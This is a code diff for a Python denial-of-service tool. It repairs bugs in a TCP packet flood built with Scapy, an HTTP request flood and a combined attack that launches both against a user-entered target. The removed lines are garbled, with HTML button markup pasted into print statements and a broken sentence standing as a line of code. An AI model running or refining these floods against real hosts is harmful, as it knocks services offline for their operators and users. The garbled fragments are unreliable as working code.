@@ -16,8 +16,7 @@ class FloodException(Exception):
     pass
 
 class Flood:
-    def __init__(self, target, no_of_packets, file_out, prn,
-                 end, payload, payload_file, port, payload_size):
+    def __init__(self, target, no_of_packets, file_out, prn, end, payload, payload_file, port, payload_size):
         self.target = target
         self.no_of_packets = no_of_packets
         self.file_out = file_out
@@ -35,27 +34,7 @@ class Flood:
             data = s.recv(1024)
             return data
         except socket.error as msg:
-            print("Error Code: " + str(msg
-  <button className="select-none no-underline">
-  <a className="" href="" target="_blank">
-        <span className="relative -top-[0rem] inline-flex">
-          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
-            0
-          </span>
-        </span>
-      </a>
-    </button>) +
-                  " -" + str(msg
-  <button className="select-none no-underline">
-  <a className="" href="" target="_blank">
-        <span className="relative -top-[0rem] inline-flex">
-          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
-            1
-          </span>
-        </span>
-      </a>
-    </button>)
-                  " - On the target " + self.target)
+            print("Error Code: " + str(msg) + " - On the target " + self.target)
             sys.exit(1)
         except FloodException as e:
             print("Error:", e)
@@ -96,27 +75,7 @@ class Flood:
             print("Error:", e)
             sys.exit(1)
         except socket.error as msg:
-            print("Error Code: " + str(msg
-  <button className="select-none no-underline">
-  <a className="" href="" target="_blank">
-        <span className="relative -top-[0rem] inline-flex">
-          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
-            0
-          </span>
-        </span>
-      </a>
-    </button>) +
-                  " -" + str(msg
-  <button className="select-none no-underline">
-  <a className="" href="" target="_blank">
-        <span className="relative -top-[0rem] inline-flex">
-          <span className="h-[1rem] min-w-[1rem] items-center justify-center rounded-full  text-center px-1 text-xs font-mono bg-muted text-[0.60rem] text-muted-foreground">
-            1
-          </span>
-        </span>
-      </a>
-    </button>)
-                  " - On the target " + self.target)
+            print("Error Code: " + str(msg) + " - On the target " + self.target)
             sys.exit(1)
         print("Payload/Attack has stopped")
 
@@ -132,48 +91,44 @@ def get_user_input():
             payload = True
             payload_file = input("Enter the path to the payload file: ")
             payload_size = int(input("Enter the size of the payload: "))
-            return target, bot_amount, attack_time, threads, port, payload, \
-                   payload_file, payload_size
+            return target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size
         else:
             payload = False
-            return target, bot_amount, attack_time, \
-                   threads, port, payload
+            return target, bot_amount, attack_time, threads, port, payload, None, None
     except Exception as e:
         print("Error:", e)
         sys.exit(1)
 
 def hulk_layer_4_attack(target, bot_amount, attack_time, threads, port):
-    ip_range = scapy.utils.iprange_to_CIDR(target)
-    target = scapy.utils IP being attacked is an IP address, not a URL.
-    
-    ip_layer = IP(dst=target)
-
-    # Add your code here
-    for _ in range(bot_amount):
-        tcp_layer = TCP()
-        data = 'Lorem Ipsum'  # Add payload (optional)
-
-        sendp(ip_layer / tcp_layer / data, inter=0.0001, loop=attack_time, verbose=False)
+    try:
+        for _ in range(bot_amount):
+            ip_layer = IP(dst=target)
+            tcp_layer = TCP(sport=random.randint(1025, 65535), dport=port)
+            data = 'Lorem Ipsum'  # Add payload (optional)
+            send(ip_layer / tcp_layer / data, inter=0.0001, count=attack_time, verbose=False)
+    except Exception as e:
+        print("Error:", e)
+        sys.exit(1)
 
 def crash_layer_7_attack():
-    target, bot_amount, attack_time, threads, port, payload = get_user_input()
-    return CrashAttack(target).start(bot_amount, attack_time)
+    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
+    flood_instance = Flood(target, bot_amount, 'output.bin', False, 1000, payload, payload_file, port, payload_size)
+    flood_instance.send_data()
 
 def httpflood_layer_7_attack():
-    target, bot_amount, attack_time, threads, port, payload = get_user_input()
-    for i in range(bot_amount):
+    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
+    for _ in range(bot_amount):
         try:
             while attack_time > 0:
                 requests.get(target)
                 attack_time -= 0.001
-        except:
-            pass
+        except Exception as e:
+            print("Error:", e)
     print(f"\nTotal requests: {bot_amount}")
 
 def combined_attack():
     target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
     hulk_layer_4_attack(target, bot_amount, attack_time, threads, port)
-    advanced_flood_attack()
     crash_layer_7_attack()
     httpflood_layer_7_attack()
 
